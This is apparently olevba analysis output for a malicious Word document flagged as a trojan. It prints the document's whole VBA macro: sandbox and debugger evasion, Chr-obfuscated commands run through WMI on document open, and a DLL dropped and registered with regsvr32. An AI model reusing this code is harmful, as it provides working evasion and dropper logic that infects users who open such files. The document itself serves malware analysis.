olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Alien.gen-12ab05046a73c455cd14831080a05d90a0ac57f1eec0064caccbae7198eaece3
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private strFile
Private CmdStr
Private txtName
Private processid
Private OLEWord
Private Result
Private K

#If VBA7 Then
Private Declare PtrSafe Function isDbgPresent Lib "kernel32" Alias "IsDebuggerPresent" () As Boolean
#Else
Private Declare Function isDbgPresent Lib "kernel32" Alias "IsDebuggerPresent" () As Boolean
#End If

Public Function IsProcessListReliable() As Boolean
    Dim objWMIService, objProcess, colProcess
    Dim strComputer, strList
    Dim bannedProcesses As Variant
    
    bannedProcesses = Array("fiddler", "vxstream", _
        "tcpview", "vmware", "procexp", "vmtools", "autoit", _
        "wireshark", "procmon", "idaq", "autoruns", "apatedns", _
        "windbg", "vboxtray")
    
    strComputer = "."

    Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" _
    & strComputer & "\root\cimv2")
    
    Set colProcess = objWMIService.ExecQuery _
    ("Select * from Win32_Process")
    
    For Each objProcess In colProcess
        For Each proc In bannedProcesses
            If InStr(LCase(objProcess.Name), LCase(proc)) <> 0 Then
                ' Found banned process.
                IsProcessListReliable = False
                Exit Function
            End If
        Next
    Next
    If isDbgPresent() Then
        IsProcessListReliable = False
        Exit Function
    End If
    IsProcessListReliable = (colProcess.Count() > 50)
End Function

Public Function IsHardwareReliable() As Boolean
    Dim objWMIService, objItem, colItems, strComputer
    Dim totalSize, totalMemory, cpusNum As Integer
    
    totalSize = 0
    totalMemory = 0
    cpusNum = 0
    
    Const wbemFlagReturnImmediately = &H10
    Const wbemFlagForwardOnly = &H20

    strComputer = "."
    
    ' Checking total HDD size
    Set objWMIService = GetObject _
    ("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colItems = objWMIService.ExecQuery _
    ("Select * from Win32_LogicalDisk")
    
    For Each objItem In colItems
        Dim num
        num = Int(objItem.Size / 1073741824)
        If num > 0 Then
            totalSize = totalSize + num
        End If
    Next
    
    If totalSize < 60 Then
        ' Total HDD size of the machine must be at least 60GB
        IsHardwareReliable = False
        Exit Function
    End If
    
    ' Checking Memory
    Set colComputer = objWMIService.ExecQuery _
    ("Select * from Win32_ComputerSystem")
    
    For Each objComputer In colComputer
        totalMemory = totalMemory + Int((objComputer.TotalPhysicalMemory) / 1048576) + 1
    Next

    If totalMemory < 1024 Then
        ' Total Memory is less than 1GB
        IsHardwareReliable = False
        Exit Function
    End If
    
    Set colItems2 = objWMIService.ExecQuery("SELECT * FROM Win32_Processor", "WQL", _
        wbemFlagReturnImmediately + wbemFlagForwardOnly)
        
    For Each objItem In colItems2
        cpusNum = cpusNum + objItem.NumberOfLogicalProcessors
    Next
    
    If cpusNum < 2 Then
        ' Nowadays everyone has at least 2 logical cores.
        IsHardwareReliable = False
        Exit Function
    End If
    
    IsHardwareReliable = True
End Function

Public Function IsRunningInSandbox() As Boolean
    Dim test As Boolean
 
    If IsProcessListReliable() <> True Then
        IsRunningInSandbox = True
        Exit Function
    ElseIf IsHardwareReliable() <> True Then
        IsRunningInSandbox = True
        Exit Function
    End If
    IsRunningInSandbox = False
End Function



Private Sub Document_Open()

If IsRunningInSandbox = False Then

strFile = "C:\Sandeep"
txtName = strFile + "\Acquisition"
CmdStr = Chr$(99) & Chr$(109) & Chr$(100) & Chr$(32) & Chr$(47) & Chr$(67) & Chr$(32) & Chr$(109) & Chr$(107) & Chr$(100) & Chr$(105) & Chr$(114)

Set OLEWord = GetObject(Chr$(119) & Chr$(105) & Chr$(110) & Chr$(109) & Chr$(103) & Chr$(109) & Chr$(116) & Chr$(115) & Chr$(58) & Chr$(87) & Chr$(105) & Chr$(110) & Chr$(51) & Chr$(50) & Chr$(95) & Chr$(80) & Chr$(114) & Chr$(111) & Chr$(99) & Chr$(101) & Chr$(115) & Chr$(115))
Result = OLEWord.create(CmdStr + " " + strFile, Null, Null, processid)

For K = CLng(Chr$(48)) To 52352
Call DateAdd(Chr$(115), K, Now)
Next K

ActiveDocument.SaveAs FileName:=txtName & ".doc", FileFormat:=wdFormatText, AddToRecentFiles:=False
ActiveDocument.SaveAs FileName:=txtName & ".txt", FileFormat:=wdFormatText, AddToRecentFiles:=False
ActiveDocument.SaveAs FileName:=txtName & ".xls", FileFormat:=wdFormatText, AddToRecentFiles:=False

Result = OLEWord.create(ThisDocument.DefaultTargetFrame + txtName + ".doc " + txtName + ".dll", Null, Null, processid)

For K = CLng(Chr$(48)) To 103056
Call DateAdd(Chr$(115), K, Now)
Next K

Result = OLEWord.create("regsvr32.exe " + txtName + ".dll", Null, Null, processid)

End If
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|vmware              |May detect virtualization                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |regsvr32.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

